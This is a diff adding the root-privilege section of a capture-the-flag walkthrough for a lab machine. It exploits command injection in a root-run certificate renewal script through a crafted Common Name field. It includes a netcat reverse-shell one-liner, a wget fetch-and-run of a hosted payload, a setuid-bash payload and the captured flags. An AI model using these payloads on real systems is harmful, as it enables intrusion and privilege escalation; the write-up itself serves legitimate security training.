@@ -356,3 +356,105 @@ uid=1000(bill) gid=1000(bill) groups=1000(bill)
 bill@broscience:/$ cat ~/user.txt 
 ad8c31e7346aead9347e843ab77a9c4f
 ```
+## Root
+There is a non-standart directroy is bill's home, called Certs.
+```bash
+bill@broscience:~$ ls
+Certs  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
+```
+In /opt, there is `renew_cert.sh` script, which might be connected to it.
+```bash
+bill@broscience:/opt$ ls
+renew_cert.sh
+```
+I am going to run [pspy](https://github.com/DominicBreuker/pspy), a tool for process dumping, and see that this script is ran by root every 2 minutes.
+```bash
+2023/04/05 09:40:01 CMD: UID=0     PID=6861   | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
+```
+Judging by the above, i will focus on the `renew_cert.sh` script. The script is quite long, but i will go over the important parts:
+```bash
+openssl x509 -in $1 -noout -checkend 86400 > /dev/null
+    if [ $? -eq 0 ]; then
+        echo "No need to renew yet.";
+        exit 1;
+    fi
+```
+According to openssl documentation, the *-checkend arg* flag
+>Checks if the certificate expires within the next arg seconds and exits nonzero if yes it will expire or zero if not.
+
+86400 seconds is one day, so in order to pass this check the certificate needs to expire in less than a day. If the certificate passes this check, it gets its subject and parses variables from it:
+```bash
+subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)
+country=$(echo $subject | grep -Eo 'C = .{2}')
+commonName=$(echo $subject | grep -Eo 'CN = .*,?')
+...
+```
+When this is done, it creates new certificate with these variables:
+```bash
+openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
+    $state
+    ...
+```
+And lastly, it moves the cerificate to bill's home directory:
+```bash
+/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
+```
+This last command is interesting, becasue it executes a command where i control a part of it (the `commonName` variable). I can abuse this by putting a semicolon character in the `commonName` variable. A sample payload that executes the `id` command:
+```bash
+commonName="certname;id;"
+```
+The second semicolon is necessary, since the script adds the `.crt` extension to to the certificate name and it would break the command.
+
+After the variable substitution the final command will look like this:
+```bash
+/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/certname;id;.crt"
+```
+I can test on my local machine that this explout indeed works.
+
+Now let's get the root shell! First i will setup a listener to catch the reverse shell:
+```bash
+nc -lvnp 9999
+listening on [any] 9999 ...
+```
+Now move over to the vulnerable machine and create the malicious certificate. Few things to remember:
+- The certificate needs to be located at `/home/bill/Certs/broscience.crt`.
+- The certificate needs to expire in less than a day when the script runs.
+When creating the certificate, i ran into an issue:
+```
+Common Name (e.g. server FQDN or YOUR name) []:whatever;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.169 9999 >/tmp/f;
+string is too long, it needs to be no more than 64 bytes long
+```
+The payload is too long. I can deal with this by hosting the payload on a webserver:
+```bash
+❯ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.169 9999 >/tmp/f' > x
+❯ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+Then get the paylod using curl:
+```bash
+Common Name (e.g. server FQDN or YOUR name) []:whatever;curl 10.10.14.169:8000/x|bash;
+```
+Openssl accepts this, however i don't get a callback. When trying out the payload manually, i notice 2 flaws:
+- Due to the parsing of the variables, bash interprets the `commonName` variable as a string.  I can bypass this by enclosing the payload in `$()` which will run the command inside the brackets.
+- There is no `curl` command on the machine, however there is `wget`, so i can use that instead.
+The final exploit looks like this:
+```bash
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out broscience.crt -sha256 -days 1
+...
+Common Name (e.g. server FQDN or YOUR name) []:$(wget 10.10.14.169:8000/x -O x;bash x)
+...
+```
+This works, and i get a shell as root, but it crashes after a few seconds. I think it's probably because of the `timeout` command. To deal with this, i will just use differnet payload, this one give the setuid permissions to bash:
+```bash
+$(chmod u+s /bin/bash)
+```
+After two minutes, i check `bash`, see that it has the setuid bit set and use it to get root.
+```
+bill@broscience:~/Certs$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+bill@broscience:~/Certs$ bash -p
+bash-5.1# id
+uid=1000(bill) gid=1000(bill) euid=0(root) groups=1000(bill)
+bash-5.1# cat /root/root.txt 
+78f4458060020f3abfa97d510a983a6c
+```
